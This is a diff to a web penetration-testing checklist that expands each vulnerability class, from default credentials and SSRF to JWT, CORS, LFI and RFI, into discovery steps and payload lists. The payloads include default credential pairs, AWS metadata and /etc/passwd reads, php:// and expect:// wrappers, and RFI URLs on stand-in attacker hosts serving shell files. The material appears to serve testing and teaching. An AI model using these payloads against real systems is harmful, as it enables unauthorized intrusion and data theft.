@@ -264,15 +264,63 @@ Bypass MIME-type or content-type filters used to restrict dangerous file types.
 
 ## 6.1 Default Credentials :
 
-Web apps still use default admin/admin or known vendor credentials.
+Use of manufacturer-set or publicly known default usernames and passwords.  
+**Discovery Path**:
+
+- Attempt login with known default credentials (e.g., `admin:admin`, `root:toor`)
+- Search for device or software default creds in databases like [https://www.cirt.net/passwords](https://www.cirt.net/passwords)
+- Inspect configuration files, code comments, or documentation for hardcoded creds
+- Review HTTP responses or error messages for credential hints
+
+**Common Payloads / Attempts**:
+
+- `admin:admin`
+- `root:root`
+- `guest:guest`
+- `admin:password`
+- `ftp:ftp`
+- `test:test`
+- Bruteforce with `hydra`, `ncrack`, or `medusa` using default creds lists
 
 ## 6.2 Directory Listing Enabled :
 
-Exposes directory contents that may contain sensitive or unused files.
+Web server is misconfigured to allow listing of directory contents, exposing sensitive files.  
+**Discovery Path**:
+
+- Manually browse to common folders (e.g., `/uploads/`, `/images/`, `/admin/`)
+- Use tools like `dirsearch`, `feroxbuster`, or `gobuster` to find exposed directories
+- Look for index pages displaying file listings (`Index of /`)
+
+**Common Payloads / Paths**:
+
+- `/uploads/`
+- `/backup/`
+- `/logs/`
+- `/admin/`
+- `/images/`
+- `/files/`
+- `/~user/` (home directories)
 
 ## 6.3 Open Admin Panels :
 
-Admin interfaces accessible without authentication or rate limiting.
+Unprotected or publicly accessible administrative interfaces that may allow unauthorized access.  
+**Discovery Path**:
+
+- Scan for common admin panel paths using tools like `dirsearch`, `feroxbuster`, or `gobuster`
+- Use search engines (e.g., Google Dork: `intitle:"admin panel"` or `inurl:admin`)
+- Analyze JavaScript files or HTTP responses for hidden or referenced admin routes
+- Check for weak or no authentication on admin endpoints
+
+**Common Payloads / Paths**:
+
+- `/admin/`
+- `/administrator/`
+- `/wp-admin/`
+- `/cms/`
+- `/login/`
+- `/controlpanel/`
+- `/cpanel/`
+- `/phpmyadmin/`
 
 ---
 
@@ -280,11 +328,42 @@ Admin interfaces accessible without authentication or rate limiting.
 
 ## 7.1 Outdated Libraries/Plugins :
 
-Known vulnerabilities in old versions of software, CMS plugins, JS libraries.
+Use of outdated or vulnerable third-party libraries, plugins, or frameworks that may expose known exploits.  
+**Discovery Path**:
+
+- Analyze `package.json`, `composer.json`, `requirements.txt`, etc. for version info
+- Inspect HTTP response headers or comments revealing library versions
+- Use scanners like `npm audit`, `retire.js`, `OWASP Dependency-Check`, or `safety`
+- Check JavaScript files in `/assets/`, `/static/`, or `/vendor/` directories
+- Monitor public CVE databases for known vulnerabilities in detected versions
+
+**Common Payloads / Checks**:
+
+- Detect jQuery versions (e.g., `jquery-1.7.1.min.js`)
+- Look for old CMS plugins/themes (e.g., WordPress, Joomla)
+- Check versions in files like:
+  - `/assets/js/libs/jquery.js`
+  - `/vendor/package/version.txt`
+  - `/static/js/bootstrap.min.js`
+- Compare found versions with [https://cve.mitre.org](https://cve.mitre.org) or [https://snyk.io/vuln](https://snyk.io/vuln)
 
 ## 7.2 CVE Exploitation :
 
-Use public exploits against unpatched components.
+Targeting known vulnerabilities (CVEs) in software, services, or components that are publicly disclosed and often weaponized.  
+**Discovery Path**:
+
+- Identify software and version via banners, headers, error messages, or exposed files
+- Use tools like `nmap`, `whatweb`, `httprint`, or `Wappalyzer` to fingerprint technologies
+- Search for known CVEs on [https://cve.mitre.org](https://cve.mitre.org), [https://nvd.nist.gov](https://nvd.nist.gov), or [https://exploit-db.com](https://exploit-db.com)
+- Correlate version info with publicly available exploits on GitHub or Exploit-DB
+
+**Common Payloads / Exploit Sources**:
+
+- CVE-specific PoCs (e.g., `CVE-2021-41773` Apache path traversal)
+- Metasploit modules: `search cve:<year>-<id>`
+- GitHub repositories containing public exploit code
+- Exploit-DB scripts: `searchsploit <software_name> <version>`
+- Shodan or Censys for identifying exposed vulnerable services
 
 ---
 
@@ -292,15 +371,59 @@ Use public exploits against unpatched components.
 
 ## 8.1 Logic Flaws :
 
-Break application flow to bypass steps (e.g., checkout without payment).
+Flaws in the application’s logic or workflow that can be abused to bypass security controls or perform unintended actions.  
+**Discovery Path**:
+
+- Analyze the application's business logic, workflows, and input handling
+- Test for unexpected behaviors (e.g., skipping steps, reordering requests)
+- Manipulate parameters or sequence of actions to bypass restrictions
+- Observe differences in server responses when altering logical conditions
+
+**Common Payloads / Techniques**:
+
+- Bypassing payment or authorization steps by modifying request sequence
+- Changing `user_id`, `order_id`, or `role` in requests
+- Skipping client-side checks and submitting direct POST requests
+- Testing multi-step workflows with missing or repeated steps
+- Abuse of discount logic, rate limits, or reward systems
 
 ## 8.2 Price Manipulation :
 
-Change item prices client-side before purchase.
+Tampering with product prices or transaction values to pay less or gain undue advantage.  
+**Discovery Path**:
+
+- Intercept and modify requests using proxies like `Burp Suite` or `OWASP ZAP`
+- Inspect client-side code (JavaScript, hidden form fields) for price data
+- Test altering price parameters in HTTP requests (e.g., `price=100` to `price=1`)
+- Analyze API endpoints for price validation weaknesses
+- Check for missing server-side verification of prices or discounts
+
+**Common Payloads / Techniques**:
+
+- Changing `price`, `total`, `discount`, or `amount` fields in requests
+- Modifying JSON payloads or form data with tampered values
+- Exploiting lack of price integrity checks in cookies or local storage
+- Replaying old transaction requests with manipulated prices
+- Bypassing client-side validation by sending crafted server requests
 
 ## 8.3 Coupon Abuse :
 
-Reuse or stack discount codes due to poor validation.
+Exploitation of discount or promotional coupon systems to gain unintended discounts or free products.  
+**Discovery Path**:
+
+- Test coupon code application beyond intended usage limits (e.g., multiple uses, stacking)
+- Attempt reuse of single-use coupons or expired coupons
+- Analyze coupon generation logic in client-side code or API endpoints
+- Inspect coupon validation and redemption workflows for weaknesses
+- Use tools like `Burp Suite` to intercept and modify coupon-related requests
+
+**Common Payloads / Techniques**:
+
+- Reusing single-use or limited-use coupon codes multiple times
+- Combining multiple coupons where only one should be allowed
+- Using invalid, expired, or manipulated coupon codes
+- Altering coupon values or expiration dates in requests
+- Exploiting predictable coupon code generation patterns
 
 ---
 
@@ -308,7 +431,21 @@ Reuse or stack discount codes due to poor validation.
 
 ## 9.1 CSRF on Critical Actions :
 
-Trick users into performing actions without consent by abusing session cookies.
+Cross-Site Request Forgery (CSRF) attacks trick authenticated users into performing unintended actions on a web application.  
+**Discovery Path**:
+
+- Identify critical actions that modify data or perform sensitive operations (e.g., password changes, fund transfers)
+- Check if these actions are protected by CSRF tokens or other anti-CSRF mechanisms
+- Use proxy tools like `Burp Suite` to capture and replay requests without CSRF tokens
+- Analyze forms and HTTP headers for presence/absence of CSRF tokens
+
+**Common Payloads / Techniques**:
+
+- Crafting malicious HTML forms or scripts that trigger requests on behalf of the victim
+- Exploiting lack of or predictable CSRF tokens
+- Submitting forged POST or GET requests that perform state-changing operations
+- Leveraging HTTP methods like POST, PUT, DELETE without CSRF protections
+- Exploiting vulnerable AJAX endpoints lacking CSRF validation
 
 ---
 
@@ -316,7 +453,22 @@ Trick users into performing actions without consent by abusing session cookies.
 
 ## 10.1 SSRF to Internal Systems :
 
-Force server to fetch internal URLs (e.g., metadata endpoints, localhost).
+Server-Side Request Forgery (SSRF) allows attackers to make requests from the vulnerable server to internal or external systems, potentially bypassing firewall restrictions.  
+**Discovery Path**:
+
+- Identify input fields or parameters that trigger server-side HTTP requests (e.g., URL fetchers, image loaders, webhooks)
+- Test with payloads targeting internal IP ranges (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`, `169.254.169.254`)
+- Use tools like `Burp Suite` or `SSRFmap` to automate SSRF detection and exploitation
+- Observe server responses and behavior when requesting internal services (databases, metadata APIs)
+
+**Common Payloads / Techniques**:
+
+- `http://127.0.0.1/`
+- `http://localhost/`
+- `http://169.254.169.254/latest/meta-data/` (AWS EC2 metadata)
+- `file:///etc/passwd` (local file inclusion via SSRF)
+- Using different protocols (e.g., `gopher://`, `dict://`) to bypass filters
+- DNS rebinding or callback techniques to detect SSRF
 
 ---
 
@@ -324,11 +476,41 @@ Force server to fetch internal URLs (e.g., metadata endpoints, localhost).
 
 ## 11.1 Insecure JWT Handling :
 
-Weakly signed or non-expiring tokens used for authentication.
+Improper implementation or validation of JSON Web Tokens (JWT) that can lead to unauthorized access or token forgery.  
+**Discovery Path**:
+
+- Analyze JWT structure and contents (header, payload, signature) using tools like `jwt.io` or `jwt-cli`
+- Check for weak signing algorithms (e.g., `alg: none`, `HS256` with known secret)
+- Attempt token tampering by modifying payload and resigning with known or no secret
+- Inspect token expiration, audience (`aud`), issuer (`iss`), and other claims for proper validation
+- Test token replay or use of expired tokens in requests
+
+**Common Payloads / Techniques**:
+
+- Using `alg: none` to bypass signature verification
+- Brute forcing or guessing JWT signing secret keys
+- Modifying token payload to escalate privileges or change user identity
+- Reusing expired or revoked tokens due to missing validation
+- Exploiting weak or hardcoded secrets in code repositories
 
 ## 11.2 Token Reuse or Prediction :
 
-Access or guess valid session or API tokens.
+Reuse or predictable generation of tokens that allow attackers to impersonate users or gain unauthorized access.  
+**Discovery Path**:
+
+- Analyze token generation patterns for predictability or weak randomness
+- Capture tokens in transit using proxy tools like `Burp Suite` or `OWASP ZAP`
+- Test reuse of old or expired tokens to check for validation lapses
+- Inspect API responses or logs for leaked or repeated tokens
+- Attempt brute force or enumeration attacks on token values
+
+**Common Payloads / Techniques**:
+
+- Reusing session, API, or authentication tokens across multiple requests or sessions
+- Predicting token values based on timestamps, user IDs, or sequential patterns
+- Exploiting missing token invalidation on logout or password changes
+- Using stolen tokens from logs, caches, or insecure storage
+- Leveraging weak random number generators in token creation
 
 ---
 
@@ -336,11 +518,40 @@ Access or guess valid session or API tokens.
 
 ## 12.1 Clickjacking :
 
-Trick users into clicking hidden elements using transparent iframes.
+An attack where a malicious site tricks users into clicking on hidden or disguised UI elements, causing unintended actions.  
+**Discovery Path**:
+
+- Check if the web application allows embedding in frames or iframes
+- Use browser developer tools or online scanners to test framing
+- Inspect HTTP response headers for `X-Frame-Options` or `Content-Security-Policy` frame directives
+- Attempt to overlay transparent layers or buttons over legitimate UI elements
+
+**Common Payloads / Techniques**:
+
+- Embedding the target site inside an invisible iframe on an attacker-controlled page
+- Using `frame` or `iframe` HTML tags to load vulnerable pages
+- Exploiting lack of `X-Frame-Options: DENY` or `SAMEORIGIN` headers
+- Leveraging `Content-Security-Policy: frame-ancestors` misconfigurations
+- Combining with social engineering to trick user clicks
 
 ## 12.2 CORS Misconfigurations :
 
-Improper CORS policies allow cross-origin data leaks or access.
+Improper Cross-Origin Resource Sharing (CORS) settings that allow unauthorized domains to access restricted resources.  
+**Discovery Path**:
+
+- Analyze `Access-Control-Allow-Origin` header values in HTTP responses
+- Test CORS behavior by sending requests with different `Origin` headers using tools like `curl` or `Burp Suite`
+- Look for wildcard (`*`) or overly permissive origins in CORS headers
+- Check for presence and correctness of other CORS headers (`Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`)
+- Use automated scanners like `Corsy` or `Nuclei` with CORS templates
+
+**Common Payloads / Techniques**:
+
+- Exploiting `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`
+- Bypassing CORS by manipulating `Origin` header values
+- Utilizing malicious websites to perform unauthorized AJAX requests
+- Leveraging CORS to steal sensitive data via cross-origin requests
+- Targeting misconfigured endpoints that trust unvalidated origins
 
 ---
 
@@ -348,11 +559,42 @@ Improper CORS policies allow cross-origin data leaks or access.
 
 ## 13.1 Local File Inclusion (LFI) :
 
-Read local server files using directory traversal (e.g., ../../etc/passwd).
+A vulnerability that allows attackers to include files from the local server, potentially exposing sensitive information or enabling code execution.  
+**Discovery Path**:
+
+- Identify parameters that include files (e.g., `?page=`, `?file=`)
+- Test with traversal payloads like `../../../../etc/passwd` to access sensitive files
+- Use tools like `Burp Suite`, `ffuf`, or `wfuzz` to automate LFI discovery
+- Check error messages revealing file paths or server structure
+- Attempt null byte injection or wrapper protocols (e.g., `php://`, `expect://`)
+
+**Common Payloads / Techniques**:
+
+- `../../../../etc/passwd`
+- `../../../../var/log/apache2/access.log`
+- `php://filter/convert.base64-encode/resource=index.php`
+- `expect://id`
+- Null byte (`%00`) injections to bypass filters
+- Combining LFI with log poisoning for code execution
 
 ## 13.2 Remote File Inclusion (RFI) :
 
-Load external malicious scripts into the application.
+A vulnerability allowing attackers to include and execute remote files on the server, often leading to remote code execution.  
+**Discovery Path**:
+
+- Identify parameters that include files (e.g., `?page=`, `?file=`) which accept remote URLs
+- Test inclusion of external URLs like `http://attacker.com/shell.txt`
+- Use tools such as `Burp Suite` or `ffuf` to fuzz and detect RFI points
+- Look for error messages or behavior indicating remote resource loading
+- Check if `allow_url_include` and `allow_url_fopen` PHP settings are enabled (if applicable)
+
+**Common Payloads / Techniques**:
+
+- `http://evil.com/shell.txt`
+- `https://attacker.com/malicious.php`
+- Using public code hosting URLs (e.g., GitHub raw files) as payload source
+- Exploiting insecure file upload or download mechanisms
+- Combining RFI with web shells for full server control
 
 ---
 
